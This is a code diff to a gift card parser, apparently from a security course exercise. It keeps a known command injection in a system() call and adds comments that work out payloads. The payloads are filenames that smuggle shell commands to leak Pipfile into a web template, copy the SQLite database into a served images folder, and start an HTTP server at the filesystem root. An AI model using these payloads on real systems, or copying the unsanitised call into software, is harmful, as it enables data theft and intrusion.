@@ -50,8 +50,32 @@ def parse_card_data(card_file_data, card_path_name):
     with open(card_path_name, 'wb') as card_file:
         card_file.write(card_file_data)
     # KG: Are you sure you want the user to control that input?
-    ret_val = system(f"./{CARD_PARSER} 2 {card_path_name} > tmp_file") # XXX command injection
+    command = f"./{CARD_PARSER} 2 {card_path_name} > tmp_file" # XXX command injection
+    print("About to execute '"+command+"'")
+    ret_val = system(command) 
     if ret_val != 0:
         return card_file_data
     with open("tmp_file", 'r') as tmp_file:
         return tmp_file.read()
+
+# './giftcardreader 2 /tmp/potato_7_parser.gftcrd > tmp_file'
+# './giftcardreader 2 /tmp/{}_7_parser.gftcrd > tmp_file'
+# './giftcardreader 2 /tmp/{somefile; cat Pipfile >> templates/navbar.html; echo}_7_parser.gftcrd > tmp_file'
+
+# .gft; cat Pipfile >> templates/navbar.html; echo ""
+# NOT a valid filename (slash!) so it fails
+
+# .gft; cp Pipfile templates; cd templates; cat Pipfile >> navbar.html; rm -f Pipfile; cd ..; echo "success";
+# THIS ONE WORKS. Can't use slashes or pushd popd because `sh`
+
+# .gft; cp db.sqlite3 templates; cd templates; cp db.sqlite3 images; cd images; mv db.sqlite3 db.jpg; cd ..; cd ..; cd ..; echo "success";
+
+# .gft; cd ..; cd ..; cd ..; cd ..; cd ..; cd ..; python2 -m SimpleHTTPServer 8001; echo "success";
+
+
+
+
+# .gft; gedit potato.txt; echo ""
+# NOT a valid filename so it fails
+
+# .gft; gedit potato.txt; echo "look ma!"; echo ""
